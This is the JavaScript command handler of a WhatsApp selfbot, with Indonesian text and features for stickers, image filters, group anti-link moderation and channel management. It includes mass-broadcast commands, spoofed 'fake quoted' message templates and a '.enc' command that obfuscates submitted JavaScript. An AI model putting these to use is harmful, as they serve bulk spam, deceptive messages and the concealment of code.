/* 

   ####### Selfbot Version 2 ########
   
   Developer: 
   - Skyzopedia (+6283181145670)
   
   Recode:
   - Isi namamu (sosmed)
   
   # Penting
   Jangan hapus credits atau nama developer
   hargai pembuat script ini!

*/
   
process.on("uncaughtException", (err) => {
console.error("Caught exception:", err);
});

const loadPluginsCommand = require("./Control/Plugins.js")
const { FakeLiveLoc, FakeTransaksi, FakeMarket } = require("./Control/FakeQuoted.js")
const Premium = JSON.parse(fs.readFileSync("./Data/premium.json"))
const Antilink = JSON.parse(fs.readFileSync("./Data/antilink.json"))
const Antilinkch = JSON.parse(fs.readFileSync("./Data/antilinkch.json"))
const BlJpm = JSON.parse(fs.readFileSync("./Data/bljpm.json"))
const Channel = JSON.parse(fs.readFileSync("./Data/channel.json"))
const Antilink2 = JSON.parse(fs.readFileSync("./Data/antilink2.json"))
const set = JSON.parse(fs.readFileSync("./Data/setbot.json"))
const Script = JSON.parse(fs.readFileSync("./Data/script.json"))


module.exports = async (m, sock, store) => {
try {
const isCmd = m.body.startsWith(m.prefix) || false
const quoted = m.quoted ? m.quoted : m
const mime = quoted?.msg?.mimetype || quoted?.mimetype || null
const args = m.body.trim().split(/ +/).slice(1)
const qmsg = (m.quoted || m)
const text = q = args.join(" ")
const Developer = JSON.parse(fs.readFileSync("./Data/developer.json"))
const isOwner = global.owner+"@s.whatsapp.net" == m.sender || m.key.fromMe || Developer.includes(m.sender)
const command = isCmd ? m.body.slice(m.prefix.length).trim().split(' ').shift().toLowerCase() : ''
const cmd = m.prefix + command
const isGrupReseller = Premium.includes(m.chat);
const botNumber = await sock.decodeJid(sock.user.id);

//========== FIX OVERLIMIT =====================//

try {
  m.isGroup = m.chat.endsWith('g.us');
  if (m.isGroup) {
    let meta = store.get(m.chat)
    m.metadata = meta;
    const p = meta.participants || [];
    m.isAdmin = p.some(i => i.id === m.sender && i.admin);
    m.isBotAdmin = p.some(i => i.id === botNumber && i.admin);
  } else {
    m.metadata = {};
    m.isAdmin = false;
    m.isBotAdmin = false;
  }
} catch {
  m.metadata = {};
  m.isAdmin = false;
  m.isBotAdmin = false;
}


function reply(teks, jids = m.chat, mention = []) {
  sock.sendMessage(
    jids,
    {
      text: teks,
      contextInfo: {
        mentionedJid: [...mention],
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: global.idChannel,
          newsletterName: `Powered by ${global.namaOwner}`,
          serverId: 200,
        },
        externalAdReply: {
          title: `${global.namaBot} Version ${global.versiBot}`,
          body: 'Whatsapp bot baileys automatic system', 
          thumbnailUrl: global.thumbnail,
          renderLargerThumbnail: true,
          mediaType: 1,
          sourceUrl: "",
        },
      },
    },
    { quoted: null }
  );
}


if (isCmd) {
console.log( chalk.yellow("Sender jids :"), chalk.blue(m.chat) + "\n" + chalk.yellow("Command message :"), chalk.blue(cmd), chalk.white("\n───────────────────────────────────────────"))
}


if (Antilinkch.includes(m.chat)) {
    const channelLinkRegex = /https?:\/\/(?:www\.)?whatsapp\.com\/channel\/[a-zA-Z0-9]+/gi;
  if (channelLinkRegex.test(m.text) && !isOwner && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
        const senderJid = m.sender;
        const messageId = m.key.id;
        const participantToDelete = m.key.participant;
        await reply(`Link Channel Terdeteksi 🚩

Tag Pengirim :
- @${m.sender.split("@")[0]}

Dilarang share/mengirim link channel di dalam grup ini.`, m.chat, [m.sender])
        await sock.sendMessage(m.chat, {
            delete: {
                remoteJid: m.chat,
                fromMe: false,
                id: messageId,
                participant: participantToDelete
            }
        });
    }
}


if (Antilink.includes(m.chat)) {
    const groupInviteLinkRegex = /chat\.whatsapp\.com|buka tautan ini untuk bergabung ke grup whatsapp/gi;
    if (groupInviteLinkRegex.test(m.text) && !isOwner && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
        const currentGroupLink = `https://chat.whatsapp.com/${await sock.groupInviteCode(m.chat)}`;
        const isLinkFromThisGroup = new RegExp(currentGroupLink, 'i').test(m.text);
        if (isLinkFromThisGroup) {
            return;
        }
        const senderJid = m.sender;
        const messageId = m.key.id;
        const participantToDelete = m.key.participant;
        await reply(`Link Grup Terdeteksi 🚩

Tag Pengirim :
- @${m.sender.split("@")[0]}

Dilarang share/mengirim link grup lain selain link grup ini.`, m.chat, [m.sender])
        await sock.sendMessage(m.chat, {
            delete: {
                remoteJid: m.chat,
                fromMe: false,
                id: messageId,
                participant: participantToDelete
            }
        });
        await sleep(800);
        await sock.groupParticipantsUpdate(m.chat, [senderJid], "remove");
    }
}


if (Antilink2.includes(m.chat)) {
    const groupInviteLinkRegex = /chat\.whatsapp\.com|buka tautan ini untuk bergabung ke grup whatsapp/gi;
    if (groupInviteLinkRegex.test(m.text) && !isOwner && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
        const currentGroupLink = `https://chat.whatsapp.com/${await sock.groupInviteCode(m.chat)}`;
        const isLinkFromThisGroup = new RegExp(currentGroupLink, 'i').test(m.text);
        if (isLinkFromThisGroup) {
            return;
        }
        const senderJid = m.sender;
        const messageId = m.key.id;
        const participantToDelete = m.key.participant;
        await reply(`Link Grup Terdeteksi 🚩

Tag Pengirim :
- @${m.sender.split("@")[0]}

Dilarang share/mengirim link grup lain selain link grup ini.`, m.chat, [m.sender])
        await sock.sendMessage(m.chat, {
            delete: {
                remoteJid: m.chat,
                fromMe: false,
                id: messageId,
                participant: participantToDelete
            }
        });
    }
}

//=============================================//


if (!isCmd) {
  const Respon = JSON.parse(fs.readFileSync("./Data/respon.json"))
  const keys = m?.text?.toLowerCase();
  const check = Respon[keys];
if (check) {
    try {
      if (check.image) {
        await sock.sendMessage(m.chat, {
          image: {url: check.image},
          caption: check.teks
        }, { quoted: FakeLiveLoc });
      } else {
        await m.reply(check.teks, { quoted: FakeLiveLoc });
      }
    } catch (err) {
      console.error('Error sending message:', err);
    }
  }
}

const handleData = { sock, text, args, isCmd, mime, qmsg, isOwner, command, cmd, reply }
if (isCmd) {
await loadPluginsCommand(m, command, handleData)
}

//=============================================//

switch (command) {

case "tourl2": {
    if (!/image/.test(mime)) return reply(`Ketik *${cmd}* dengan reply foto`)
    const { ImageUploadService } = require('node-upload-images');
    try {
        let mediaPath = await sock.download(qmsg);
        const service = new ImageUploadService('pixhost.to');
  let buffer = fs.readFileSync(mediaPath);
  let { directLink } = await service.uploadFromBinary(buffer, 'skyzo.png');
  await reply(directLink)
        await fs.unlinkSync(mediaPath);
    } catch (err) {
        console.error("Tourl Error:", err);
        reply("Terjadi kesalahan saat mengubah media menjadi URL.");
    }
}
break;

//=============================================//

case "tourl": {
if (!/image|video|audio|application/.test(mime)) return reply(`Media tidak ditemukan!\nKetik *${cmd}* dengan reply/kirim media`)
    const FormData = require('form-data');
    const { fromBuffer } = require('file-type');    
    async function dt(buffer) {
        const fetchModule = await import('node-fetch');
        const fetch = fetchModule.default;
        let { ext } = await fromBuffer(buffer);
        let bodyForm = new FormData();
        bodyForm.append("fileToUpload", buffer, "file." + ext);
        bodyForm.append("reqtype", "fileupload");
        let res = await fetch("https://catbox.moe/user/api.php", {
            method: "POST",
            body: bodyForm,
        });
        let data = await res.text();
        return data;
    }

    let aa = m.quoted ? await m.quoted.download() : await m.download();
    let dd = await dt(aa);
    await reply(dd)
}
break

//=============================================//

case "tohd": case "hd": case "remini": {
if (!/image/.test(mime)) return reply(`Media tidak ditemukan!\nKetik *${cmd}* dengan reply/kirim media`)
    const FormData = require('form-data');
    const { fromBuffer } = require('file-type');    
    async function dt(buffer) {
        const fetchModule = await import('node-fetch');
        const fetch = fetchModule.default;
        let { ext } = await fromBuffer(buffer);
        let bodyForm = new FormData();
        bodyForm.append("fileToUpload", buffer, "file." + ext);
        bodyForm.append("reqtype", "fileupload");
        let res = await fetch("https://catbox.moe/user/api.php", {
            method: "POST",
            body: bodyForm,
        });
        let data = await res.text();
        return data;
    }

    let aa = m.quoted ? await m.quoted.download() : await m.download();
    let dd = await dt(aa);
    const ress = await fetchJson(`https://api-simplebot.vercel.app/imagecreator/remini?apikey=${global.ApikeyRestApi}&url=${dd}`)
    await sock.sendMessage(m.chat, {image: {url: ress.result}, caption: `Berhasil meningkatkan kualitas gambar ✅`}, {quoted: m})
}
break

//=============================================//

case "toghibli": {
if (!/image/.test(mime)) return reply(`Media tidak ditemukan!\nKetik *${cmd}* dengan reply/kirim media`)
    const FormData = require('form-data');
    const { fromBuffer } = require('file-type');    
    async function dt(buffer) {
        const fetchModule = await import('node-fetch');
        const fetch = fetchModule.default;
        let { ext } = await fromBuffer(buffer);
        let bodyForm = new FormData();
        bodyForm.append("fileToUpload", buffer, "file." + ext);
        bodyForm.append("reqtype", "fileupload");
        let res = await fetch("https://catbox.moe/user/api.php", {
            method: "POST",
            body: bodyForm,
        });
        let data = await res.text();
        return data;
    }

    let aa = m.quoted ? await m.quoted.download() : await m.download();
    let dd = await dt(aa);
    const ress = await fetchJson(`https://api-simplebot.vercel.app/imagecreator/toghibli?apikey=${global.ApikeyRestApi}&url=${dd}`)
    await sock.sendMessage(m.chat, {image: {url: ress.result}, caption: `Berhasil mengubah style ghibli ✅`}, {quoted: m})
}
break

//=============================================//

case "ireng": case "hitamkan": case "tohitam": {
if (!/image/.test(mime)) return reply(`Media tidak ditemukan!\nKetik *${cmd}* dengan reply/kirim media`)
    const FormData = require('form-data');
    const { fromBuffer } = require('file-type');    
    async function dt(buffer) {
        const fetchModule = await import('node-fetch');
        const fetch = fetchModule.default;
        let { ext } = await fromBuffer(buffer);
        let bodyForm = new FormData();
        bodyForm.append("fileToUpload", buffer, "file." + ext);
        bodyForm.append("reqtype", "fileupload");
        let res = await fetch("https://catbox.moe/user/api.php", {
            method: "POST",
            body: bodyForm,
        });
        let data = await res.text();
        return data;
    }

    let aa = m.quoted ? await m.quoted.download() : await m.download();
    let dd = await dt(aa);
    const ress = await fetchJson(`https://api-simplebot.vercel.app/imagecreator/tohitam?apikey=${global.ApikeyRestApi}&url=${dd}`)
    await sock.sendMessage(m.chat, {image: {url: ress.result}, caption: `Berhasil hitamkan kulit ✅`}, {quoted: m})
}
break

//=============================================//

case "removebg": case "rmbg": {
if (!/image/.test(mime)) return reply(`Media tidak ditemukan!\nKetik *${cmd}* dengan reply/kirim media`)
    const FormData = require('form-data');
    const { fromBuffer } = require('file-type');    
    async function dt(buffer) {
        const fetchModule = await import('node-fetch');
        const fetch = fetchModule.default;
        let { ext } = await fromBuffer(buffer);
        let bodyForm = new FormData();
        bodyForm.append("fileToUpload", buffer, "file." + ext);
        bodyForm.append("reqtype", "fileupload");
        let res = await fetch("https://catbox.moe/user/api.php", {
            method: "POST",
            body: bodyForm,
        });
        let data = await res.text();
        return data;
    }

    let aa = m.quoted ? await m.quoted.download() : await m.download();
    let dd = await dt(aa);
    const ress = await fetchJson(`https://api-simplebot.vercel.app/imagecreator/removebg?apikey=${global.ApikeyRestApi}&url=${dd}`)
    await sock.sendMessage(m.chat, {image: {url: ress.result}, caption: `Berhasil menghapus background gambar ✅`}, {quoted: m})
}
break

//=============================================//

case "sticker": case "stiker": case "sgif": case "s": {
if (!/image|video/.test(mime)) return reply(`Kirim/reply media dengan mengetik ${cmd}`); 
if (/video/.test(mime)) {
if ((qmsg).seconds > 15) return reply("Durasi video dilarang melebihi 15detik!")
}
var media = await sock.download(qmsg)
await sock.sendSticker(m.chat, media, m, {packname: "@SkyzopediaDev"})
await fs.unlinkSync(media)
}
break

//=============================================//

case "stickerwm": case "swm": case "wm": {
if (!text) return reply(`Input wm & reply fotonya\n*contoh:* ${cmd} skyzopedia dengan me-reply foto`); 
if (!/image|video/.test(mime)) return reply(`Input wm & reply fotonya!\n*contoh:* ${cmd} skyzopedia dengan me-reply foto`); 
if (/video/.test(mime)) {
if ((qmsg).seconds > 15) return reply("Durasi vidio maksimal 15 detik!")
}
var media = await sock.download(qmsg)
await sock.sendSticker(m.chat, media, m, {packname: text})
await fs.unlinkSync(media)
}
break

//=============================================//

case "brat": {
if (!text) return reply(`Masukan teksnya\n*contoh:* ${cmd} skyzopedia`);
await sock.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Type',
          sections: [
            {
              title: `© ${global.namaBot} Version ${global.versiBot}`,
              rows: [
                {
                  title: 'Brat Image',
                  description: 'Sticker brat dengan type foto', 
                  id: `.brat1 ${text}`
                },
                {
                  title: 'Brat Vidio',
                  description: 'Sticker brat dengan type vidio/gif', 
                  id: `.bratvid2 ${text}`
                }             
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  text: "\nPilih Type Sticker Brat (Image/Gif)\n"
}, { quoted: m })
}
break

//=============================================//

case "brat1": case "bratvid2": {
if (!text) return
let type = 'image'
if (/bratvid2/.test(command)) type = 'animated'
const media = `https://fastrestapis.fasturl.cloud/maker/brat/animated?text=${encodeURIComponent(text)}&mode=${type}`
await reply(`Memproses pembuatan sticker . . .`)
await sock.sendSticker(m.chat, media, m, {packname: "Selfbot-Skyzopedia"})
}
break

//=============================================//

case "ai": {
    if (!isOwner) return reply(mess.owner)
    if (!text) return reply(`*contoh:* .ai jelaskan apa itu nodejs (bisa dengan mengirim foto juga)`);

    const fs = require('fs');
    const fetch = require('node-fetch');
    const { ImageUploadService } = require('node-upload-images');
    const service = new ImageUploadService('postimages.org');

    const askToAI = async (question, imageUrl = null) => {
        try {
            const url = `https://fastrestapis.fasturl.cloud/aillm/gpt-4o-mini?ask=${encodeURIComponent(question)}${imageUrl ? `&imageUrl=${encodeURIComponent(imageUrl)}` : ''}`;
            const res = await fetch(url);
            const json = await res.json();
            return json.result || "Tidak ada jawaban.";
        } catch (err) {
            console.log("AI Request Error:", err);
            return "Terjadi kesalahan saat menghubungi AI.";
        }
    };

    const uploadToUrl = async (buffer) => {       
    try {        
  let { directLink } = await service.uploadFromBinary(buffer, 'skyzo.png');        
        return directLink.toString()
    } catch (err) {           
       console.log(err)
        return null
    }
    };

    // Jika ada gambar yang dikirim
    if (/image/.test(mime)) {
        try {
            const imgPath = await sock.download(qmsg);
            const buffer = fs.readFileSync(imgPath);
            const imageUrl = await uploadToUrl(buffer);

            if (!imageUrl) {
                fs.unlinkSync(imgPath);
                return reply("Gagal mengupload gambar.");
            }

            const result = await askToAI(text, imageUrl);
            await reply(result);
            fs.unlinkSync(imgPath);
        } catch (err) {
            console.error("Image AI Error:", err);
            return reply("Terjadi kesalahan saat memproses gambar.");
        }
    } else {
        // Jika tanpa gambar
        const result = await askToAI(text);
        return reply(result);
    }
}
break;

//=============================================//

case "enc": {
if (!m.quoted) return reply(`Ketik *${cmd}* dengan reply file yang berformat .js`)
let filename = m.quoted.fakeObj.message.documentMessage.fileName || m.fakeObj.message.documentMessage.fileName || ""
if (!filename.endsWith(".js")) return reply(`Ketik *${cmd}* dengan reply file yang berformat .js`)
let media = m.quoted ? await m.quoted.download() : await m.download()
global.encryptFile = {
buffer: media, 
filename: filename
}
await sock.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Type',
          sections: [
            {
              title: `© ${global.namaBot} Version ${global.versiBot}`,
              rows: [
                {
                  title: 'Encrypt Hard V1',
                  id: `.enc1 ${text}`
                },
                {
                  title: 'Encrypt Hard V2',
                  id: `.enc2 ${text}`
                }             
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  text: `\nPilih Type Encrypt File\n`
}, { quoted: m })
}
break

//=============================================//

case "enc1": {
if (!global.encryptFile) return reply(`File tidak ditemukan\nketik ulang perintah *.enc*`)
const strings = text ? text : "EncBySkyzopedia"
let media = global.encryptFile.buffer
let filename = global.encryptFile.filename
await reply(`Memproses encrypt hard v1 file ${filename}`)
await Obfus.obfuscate(media.toString(), {
target: "node",
    preset: "high",
    compact: true,
    minify: true,
    flatten: true,
    identifierGenerator: function() {
        const originalString = 
            "高宝座Skyzopedia齐Xz高宝座高" + 
            "高宝座Skyzopedia齐Xz高宝座高";

        function hapusKarakterTidakDiinginkan(input) {
            return input.replace(
                /[^a-zA-Z/*ᨒZenn/*^/*($break)*/]/g, ''
            );
        }

        function stringAcak(panjang) {
            let hasil = '';
            const karakter = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
            const panjangKarakter = karakter.length;

            for (let i = 0; i < panjang; i++) {
                hasil += karakter.charAt(
                    Math.floor(Math.random() * panjangKarakter)
                );
            }
            return hasil;
        }

        return hapusKarakterTidakDiinginkan(originalString) + stringAcak(2);
    },
    renameVariables: true,
    renameGlobals: true,

    // Kurangi encoding dan pemisahan string untuk mengoptimalkan ukuran
    stringEncoding: 0.01, 
    stringSplitting: 0.1, 
    stringConcealing: true,
    stringCompression: true,
    duplicateLiteralsRemoval: true,

    shuffle: {
        hash: false,
        true: false
    },
    controlFlowFlattening: false, 
    opaquePredicates: false, 
    deadCode: false, 
    dispatcher: false,
    rgf: false,
    calculator: false,
    hexadecimalNumbers: false,
    movedDeclarations: true,
    objectExtraction: true,
    globalConcealing: true
}).then(async (obfuscated) => {
  await fs.writeFileSync(`./Tmp/enchard-${filename}`, obfuscated.code)
  await sock.sendMessage(m.chat, {document: await fs.readFileSync(`./Tmp/enchard-${filename}`), mimetype: "application/javascript", fileName: filename, caption: `Berhasil encrypt file ${filename} ✅`}, {quoted: m})
}).catch(e => reply("Error :" + e))
delete global.encryptFile
await fs.unlinkSync(`./Tmp/enchard-${filename}`)
}
break

//=============================================//

case "enc2": {
if (!global.encryptFile) return reply(`File tidak ditemukan\nketik ulang perintah *.enc*`)
let media = global.encryptFile.buffer
let filename = global.encryptFile.filename
await reply(`Memproses encrypt hard v2 file ${filename}`)
async function encryptJS() {
  try {
    const inputCode = media.toString()
    const encryptedCode = await Obfus.obfuscate(inputCode, {
      target: "node", 
      preset: "high", 
    stringEncoding: true,
    identifierGenerator: "zeroWidth", // bisa coba "number", "hexadecimal", "zeroWidth"
    });
    await fs.writeFileSync(`./Tmp/enchard-${filename}`, encryptedCode.code)
  await sock.sendMessage(m.chat, {document: await fs.readFileSync(`./Tmp/enchard-${filename}`), mimetype: "application/javascript", fileName: filename, caption: `Berhasil encrypt file ${filename} ✅`}, {quoted: m})
  } catch (err) {
    console.error("Gagal mengenkripsi file:", err);
  }
  delete global.encryptFile
  await fs.unlinkSync(`./Tmp/enchard-${filename}`)
}

return encryptJS();
}
break

//=============================================//

case "addidch":
case "addid": {
    if (!isOwner) return reply(mess.owner)
    if (!text) return reply("Input idchannel/linknya\n*contoh:* .addidch 12345@newsletter")
    let ids
    if (text.includes("https://whatsapp.com/channel")) {
    let result = text.split('https://whatsapp.com/channel/')[1]
    let res = await sock.newsletterMetadata("invite", result)
    ids = [res.id]
    } else if (text.includes("@newsletter")) {
    ids = text.split(",").map(i => i.trim()) 
    if (ids.some(id => !id.endsWith("@newsletter"))) {
        return reply("Input idchannel/linknya\n*contoh:* .addidch 12345@newsletter")
    }
    } else {
    return reply("Input idchannel/linknya\n*contoh:* .addidch 12345@newsletter")
    }

    let newIds = ids.filter(id => !Channel.includes(id)) // Hindari duplikasi

    if (newIds.length === 0) {
        return reply("Semua ID yang dimasukkan sudah ada di dalam database idch")
    }

    Channel.push(...newIds) // Tambahkan ID baru

    try {
        await fs.writeFileSync("./Data/channel.json", JSON.stringify(Channel, null, 2))
        reply(`Berhasil menambah ${newIds.length} ID channel ✅`)
    } catch (err) {
        console.error("Error menyimpan file:", err)
        reply("Terjadi kesalahan saat menyimpan data.")
    }
    }
break

//=============================================//

case "listidch": case "listid": case "listch": {
if (!isOwner) return reply(mess.owner)
    if (Channel.length < 1) return reply("Tidak ada ID Channel di dalam database idch.") 
    let teks = `\n* Total ID Channel: ${Channel.length}\n`
    for (let id of Channel) {
        let name = "Nama tidak ditemukan"
        try {
        let ch = await sock.newsletterMetadata("jid", id)        
        name = ch.name
        } catch {}
        teks += `\n* ${id}\n* ${name}\n`;
    }
    return reply(teks);
}
break;

//=============================================//

case "delid": case "delidch": {
if (!isOwner) return reply(mess.owner)
if (Channel.length < 1) return reply("Tidak ada ID Channel di dalam database idch.")
let rows = []
let number = 0
rows.push({
title: "Hapus semua",
description: "Hapus semua ID Channel", 
id: `.delidch-response all`
})
for (let u of Channel) {
let name = "Nama tidak ditemukan"
try {
let ch = await sock.newsletterMetadata("jid", u)        
name = ch.name
} catch {}
rows.push({
title: u,
description: name, 
id: `.delidch-response ${u}`
})
}
await sock.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih ID',
          sections: [
            {
              title: `© ${global.namaBot} Version ${global.versiBot}`,
              rows: rows
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  text: `\nPilih ID Channel Yang Ingin Dihapus\nTotal ID Channel: ${Channel.length}\n`
}, { quoted: m })
}
break

//=============================================//

case "delidch-response": {
    if (!isOwner) return reply(mess.owner)
    if (!Channel || Channel.length < 1) return reply("Tidak ada ID Channel di dalam database idch.")
    if (!text) return
    const input = text.trim()
    if (input.toLowerCase() === "all") {
        Channel.length = 0
        await fs.writeFileSync("./Data/channel.json", JSON.stringify(Channel, null, 2))
        return reply("Berhasil menghapus semua ID Channel ✅")
    }

    if (!Channel.includes(input)) {
        return reply(`ID Channel ${input} tidak ditemukan dalam database.`)
    }
    const index = Channel.indexOf(input)
    Channel.splice(index, 1)
    await fs.writeFileSync("./Data/channel.json", JSON.stringify(Channel, null, 2))
    reply(`Berhasil menghapus ID Channel ✅\n${input}`)
}
break

//=============================================//

case "jpmch": {
    if (!isOwner) return reply(mess.owner)
    if (!Channel || Channel.length < 1) return reply("Tidak ada ID Channel di dalam database idch.")
    if (!text) return reply("Input teks & kirim foto (opsional)\n*Contoh:* .jpmch pesannya")

    let mediaPath
    const mimeType = mime
    if (/image/.test(mimeType)) {
        mediaPath = await sock.download(qmsg)
    }

    const channelList = Channel
    let successCount = 0
    const messageType = mediaPath ? "teks & foto" : "teks"
    const senderChat = m.chat

    const messageContent = mediaPath
        ? { image: await fs.readFileSync(mediaPath), caption: text }
        : { text }

    await reply(`Memproses JPM ${messageType} ke ${channelList.length} Channel WhatsApp.`)

    for (const chId of channelList) {
        try {
            await sock.sendMessage(chId, messageContent)
            successCount++
        } catch (err) {
            console.error(`Gagal kirim ke channel ${chId}:`, err)
        }
        await sleep(3500)
    }

    if (mediaPath) await fs.unlinkSync(mediaPath)    
    await reply(`JPM Channel Telah Selsai ✅\nBerhasil dikirim ke ${successCount} Channel WhatsApp.`, senderChat)
}
break

//=============================================//

case "cekidch":
case "idch": {
  if (!text) return reply(`*contoh:* ${cmd} link channel`); 
  if (!text.includes("https://whatsapp.com/channel/")) {
    return reply("Link channel tidak valid");
  }
  let result = text.split("https://whatsapp.com/channel/")[1];
  let res = await sock.newsletterMetadata("invite", result);
  let teks = `${res.id}`;
  return m.reply(teks);
}
break;

//=============================================//

case "reactch": {
    if (!isOwner) return reply(mess.owner);
    if (!text) return reply(`*contoh:*\n${cmd} linkpesan ❤️`);
    if (!args[0] || !args[1]) return reply(`*contoh:*\n${cmd} linkpesan ❤️`);
    if (!args[0].includes("https://whatsapp.com/channel/")) return reply("Link pesan channel tidak valid!");

    try {
        let parts = args[0].split('/');
        let result = parts[4];
        let serverId = parts[5];

        if (!result || !serverId) return reply("Link pesan channel tidak valid!");

        let res = await sock.newsletterMetadata("invite", result);
        await sock.newsletterReactMessage(res.id, serverId, args[1]);

        reply(`Berhasil mengirim reaction ${args[1]} ke dalam channel ${res.name}`);
    } catch (e) {
        console.error(e);
        reply("Terjadi kesalahan saat mengirim reaction. Coba periksa kembali link dan emoji.");
    }
}
break;

//=============================================//

case "joinch":
case "joinchannel": {
    if (!isOwner) return reply(mess.owner);
    if (!text && !m.quoted) return reply(`*contoh:* ${cmd} link channel`);

    let link = text || m.quoted?.text || "";

    if (!link.includes("https://whatsapp.com/channel/")) {
        return reply("Link channel tidak valid!");
    }

    try {
        let result = link.split("https://whatsapp.com/channel/")[1];
        if (!result) return reply("Link channel tidak valid!");

        let res = await sock.newsletterMetadata("invite", result);
        await sock.newsletterFollow(res.id);

        reply(`Berhasil bergabung kedalam channel ✅

- ${res.name}
- ${res.subscribers + 1} Pengikut`);
    } catch (e) {
        console.error(e);
        reply("Terjadi kesalahan saat mencoba join channel. Pastikan link valid dan bot belum join sebelumnya.");
    }
}
break;

//=============================================//

case "bljpm": case "bl": {
if (!isOwner) return reply(mess.owner);
let rows = []
const a = await sock.groupFetchAllParticipating()
if (a.length < 1) return reply("Tidak ada grup chat.")
const Data = Object.values(a)
let number = 0
for (let u of Data) {
const name = u.subject || "Unknown"
rows.push({
title: name,
description: `ID Grup - ${u.id}`, 
id: `.bljpm-response ${u.id}|${name}`
})
}
await sock.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Grup',
          sections: [
            {
              title: `© ${global.namaBot} Version ${global.versiBot}`,
              rows: rows
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  text: `\nPilih Grup Yang Ingin Diblacklist Dari Jpm\n`
}, { quoted: m })
}
break

//=============================================//

case "bljpm-response":
case "bl-response": {
    if (!isOwner) return reply(mess.owner);
    if (!text || !text.includes("|")) return
    const groupId = text.split("|")[0]
    const names = text.split("|")[1]
    if (BlJpm.includes(groupId)) {
        return reply(`Grup ${names} sudah di blacklist dari jpm!`);
    }
    BlJpm.push(groupId);
    try {
        await fs.writeFileSync("./Data/bljpm.json", JSON.stringify(BlJpm, null, 2));
        reply(`Berhasil blacklist grup ${names} dari jpm ✅`);
    } catch (err) {
        console.error(err);
        reply("Gagal menyimpan data akses. Silakan coba lagi.");
    }
}
break;

//=============================================//

case "delbl": case "delbljpm": {
if (!isOwner) return reply(mess.owner);
if (BlJpm.length < 1) return reply("Tidak ada data blacklist grup.")
let rows = []
let number = 0
rows.push({
title: "Hapus semua",
description: `Hapus semua blacklist grup`, 
id: `.delbl-response all`
})
for (let u of BlJpm) {
let name
try {
const g = await sock.groupMetadata(u)
name = g.subject || "Unknown"
} catch {
name = "Unknown"
}
rows.push({
title: name,
description: `ID Grup - ${u}`, 
id: `.delbl-response ${u}|${name}`
})
}
await sock.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Grup',
          sections: [
            {
              title: `© ${global.namaBot} Version ${global.versiBot}`,
              rows: rows
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  text: `\nPilih Grup Yang Ingin Dihapus Dari Data Blacklist\nTotal Grup: ${BlJpm.length}\n`
}, { quoted: m })
}
break

//=============================================//

case "delbl-response": {
  if (!isOwner) return reply(mess.owner);
  if (BlJpm.length === 0) return reply("Tidak ada data blacklist grup.")
  const input = text.split("|")[0]
  const names = text.split("|")[1]
  if (input == "all") {
  BlJpm.length = 0
  fs.writeFileSync("./Data/bljpm.json", JSON.stringify(BlJpm, null, 2))
  return reply(`Berhasil menghapus semua blacklist grup dari jpm ✅`)
  }
  if (!BlJpm.includes(input)) {
    return reply(`Grup ${names} tidak di blacklist dari jpm!`)
  }
  const index = BlJpm.indexOf(input)
  BlJpm.splice(index, 1)
  fs.writeFileSync("./Data/bljpm.json", JSON.stringify(BlJpm, null, 2))
  return reply(`Berhasil menghapus blacklist grup ${names} dari jpm ✅`)
}
break

//=============================================//

case "addakses":
case "addaksesgc": {
    if (!isOwner) return reply(mess.owner);
    if (!m.isGroup) return reply(mess.group);
    const groupId = m.chat;
    if (Premium.includes(groupId)) {
        return reply("Grup ini sudah memiliki akses reseller panel!");
    }
    Premium.push(groupId);
    try {
        await fs.writeFileSync("./Data/premium.json", JSON.stringify(Premium, null, 2));
        reply("Berhasil menambahkan grup sebagai reseller panel ✅");
    } catch (err) {
        console.error(err);
        reply("Gagal menyimpan data akses. Silakan coba lagi.");
    }
}
break;

//=============================================//

case "delakses":
case "delaksesgc": {
  if (!isOwner) return reply(mess.owner);
  if (!m.isGroup) return reply(mess.group);
  if (Premium.length === 0) return reply("Tidak ada grup reseller panel.")
  const input = text ? text.trim() : m.chat
  if (input.toLowerCase() === "all") {
    Premium.length = 0
    fs.writeFileSync("./Data/premium.json", JSON.stringify(Premium, null, 2))
    return reply("Berhasil menghapus *semua grup reseller panel ✅")
  }
  if (!Premium.includes(input)) {
    return reply("Grup ini bukan grup reseller panel")
  }
  const index = Premium.indexOf(input)
  Premium.splice(index, 1)
  fs.writeFileSync("./Data/premium.json", JSON.stringify(Premium, null, 2))
  return reply("Berhasil menghapus grup reseller panel ✅")
}
break

//=============================================//

case "listakses": {
    if (!isOwner) return reply(mess.owner);
    if (Premium.length < 1) return reply("Tidak ada grup reseller panel.");
    const datagc = await sock.groupFetchAllParticipating();
    let teks = "";

    for (let id of Premium) {
        const grup = datagc[id];
        const nama = grup ? grup.subject : "Grup tidak ditemukan";
        teks += `\n* ID: ${id}\n* Nama Grup: ${nama}\n`;
    }
    return reply(teks);
}
break;

//=============================================//

case "jpmht": {
if (!isOwner) return reply(mess.owner);
